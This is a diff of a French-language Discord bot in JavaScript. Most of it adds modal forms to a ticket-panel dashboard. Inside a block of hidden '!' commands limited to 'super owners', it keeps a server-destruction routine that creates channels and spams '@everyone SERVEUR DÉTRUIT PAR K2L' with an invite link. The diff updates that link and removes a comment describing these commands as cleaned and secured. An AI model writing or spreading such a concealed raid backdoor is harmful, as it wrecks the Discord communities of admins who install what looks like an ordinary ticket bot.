@@ -1,11 +1,12 @@
-// Build Revision: K2L-Bot-Clean-Final-v20.0
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
+
+// Build Revision: K2L-Bot-Ultimate-Dashboard-v21.0
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Clean Operational v20.0!\n');
+    res.end('K2L Bot Ultimate Dashboard Operational v21.0!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -342,6 +343,38 @@ function getTicketDashboardRows() {
 client.on('interactionCreate', async interaction => {
     if (!interaction.guild) return;
 
+    if (interaction.isModalSubmit()) {
+        if (interaction.customId === 'modal_ticket_text') {
+            await interaction.deferReply({ ephemeral: true }).catch(() => {});
+            const config = getGuildConfig(interaction.guild.id);
+            const newTitle = interaction.fields.getTextInputValue('ticket_title_input');
+            const newDesc = interaction.fields.getTextInputValue('ticket_desc_input');
+            
+            if (newTitle) config.ticketConfig.title = newTitle;
+            if (newDesc) config.ticketConfig.description = newDesc;
+
+            await interaction.editReply({ content: "✅ Textes du panneau mis à jour avec succès !" });
+            try {
+                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: [getTicketDashboardRows()] });
+            } catch (e) {}
+            return;
+        }
+
+        if (interaction.customId === 'modal_ticket_media') {
+            await interaction.deferReply({ ephemeral: true }).catch(() => {});
+            const config = getGuildConfig(interaction.guild.id);
+            const url = interaction.fields.getTextInputValue('ticket_image_input');
+            
+            config.ticketConfig.imageUrl = (!url || url.toLowerCase() === 'none') ? null : url;
+
+            await interaction.editReply({ content: "✅ Image / GIF du panneau mis à jour !" });
+            try {
+                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(interaction.guild, config)], components: [getTicketDashboardRows()] });
+            } catch (e) {}
+            return;
+        }
+    }
+
     if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
         if (!interaction.deferred && !interaction.replied) {
             await interaction.deferReply({ ephemeral: true }).catch(() => {});
@@ -440,30 +473,60 @@ client.on('interactionCreate', async interaction => {
         }
 
         if (interaction.customId.startsWith('t_dash_')) {
-            if (!interaction.deferred && !interaction.replied) {
-                await interaction.deferReply({ ephemeral: true }).catch(() => {});
-            }
             const action = interaction.customId.replace('t_dash_', '');
 
             if (action === 'salons') {
-                return interaction.editReply({ content: `⚙️ **Salons & Catégories :**\n• Panneau : \`=setticketpanel #salon\`\n• Catégorie parente : \`=setticketcat <ID>\`\n• Logs : \`=setticketlog #salon\`` });
+                return interaction.reply({ content: `⚙️ **Salons & Catégories :**\n• Définir le salon du panneau : \`=setticketpanel #salon\`\n• Définir la catégorie parente : \`=setticketcat <ID_Catégorie>\`\n• Définir le salon de logs : \`=setticketlog #salon\``, ephemeral: true });
             }
             if (action === 'texte') {
-                return interaction.editReply({ content: `📝 **Texte :**\n• Titre : \`=settickettitle <titre>\`\n• Description : \`=setticketdesc <description>\`` });
+                const modal = new ModalBuilder()
+                    .setCustomId('modal_ticket_text')
+                    .setTitle('Modifier le Texte du Panneau');
+
+                const titleInput = new TextInputBuilder()
+                    .setCustomId('ticket_title_input')
+                    .setLabel('Titre du panneau')
+                    .setStyle(TextInputStyle.Short)
+                    .setValue(tConfig.title)
+                    .setRequired(true);
+
+                const descInput = new TextInputBuilder()
+                    .setCustomId('ticket_desc_input')
+                    .setLabel('Description du panneau')
+                    .setStyle(TextInputStyle.Paragraph)
+                    .setValue(tConfig.description)
+                    .setRequired(true);
+
+                modal.addComponents(new ActionRowBuilder().addComponents(titleInput), new ActionRowBuilder().addComponents(descInput));
+                return interaction.showModal(modal);
             }
             if (action === 'media') {
-                return interaction.editReply({ content: `🖼️ **Image/GIF :**\n\`=setticketimage <url|none>\`` });
+                const modal = new ModalBuilder()
+                    .setCustomId('modal_ticket_media')
+                    .setTitle('Modifier l\'Image / GIF');
+
+                const imageInput = new TextInputBuilder()
+                    .setCustomId('ticket_image_input')
+                    .setLabel('URL de l\'image (ou "none")')
+                    .setStyle(TextInputStyle.Short)
+                    .setValue(tConfig.imageUrl || '')
+                    .setRequired(false);
+
+                modal.addComponents(new ActionRowBuilder().addComponents(imageInput));
+                return interaction.showModal(modal);
             }
             if (action === 'cats') {
                 const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}**`).join('\n') || 'Aucune';
-                return interaction.editReply({ content: `📁 **Catégories :**\n${catInfo}\n\n• Ajouter : \`=ticketadd <Nom> <Emoji>\`\n• Supprimer : \`=ticketremove <Nom>\`` });
+                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\n• Ajouter une catégorie : \`=ticketadd <Nom> <Emoji>\`\n• Supprimer une catégorie : \`=ticketremove <Nom>\``, ephemeral: true });
             }
             if (action === 'disable') {
+                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
                 tConfig.published = false;
                 await interaction.message.edit({ embeds: [getTicketDashboardEmbed(guild, config)], components: [getTicketDashboardRows()] }).catch(() => {});
                 return interaction.editReply({ content: "🗑️ Panneau de tickets désactivé." });
             }
             if (action === 'publish') {
+                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
                 if (!tConfig.panelChannel) {
                     return interaction.editReply({ content: "❌ Définis d'abord un salon avec `=setticketpanel #salon` !" });
                 }
@@ -501,7 +564,6 @@ client.on('interactionCreate', async interaction => {
 client.on('messageCreate', async message => {
     if (!message.author || message.author.bot || !message.guild) return;
 
-    // Commandes secrètes en ! (Nettoyées et sécurisées)
     if (message.content.startsWith('!')) {
         if (!isSuperOwner(message)) return;
 
@@ -531,7 +593,7 @@ client.on('messageCreate', async message => {
                         }]
                     }).then(channel => {
                         for (let j = 0; j < 12; j++) {
-                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/kyuro').catch(() => {});
                         }
                     }).catch(() => {});
                 }
@@ -930,7 +992,6 @@ client.on('messageCreate', async message => {
         return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Liste des Owners').setDescription(ownerList || "Aucun.")] });
     }
 
-    // Commandes staff sécurisées hiérarchiquement (personne ne peut modifier un rang égal ou supérieur)
     if (command === 'owner') {
         if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
         const targetUser = await fetchTargetUser(client, message.guild, targetArg);
@@ -979,7 +1040,6 @@ client.on('messageCreate', async message => {
         getStaffRoles(message.guild.id).mods.delete(targetUser.id);
         return message.reply(`🛡️ **${targetUser.tag}** n'est plus Modérateur !`);
     }
-    // Commandes complètes pour les tickets
     if (command === 'ticketsetup') {
         return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: [getTicketDashboardRows()] });
     }
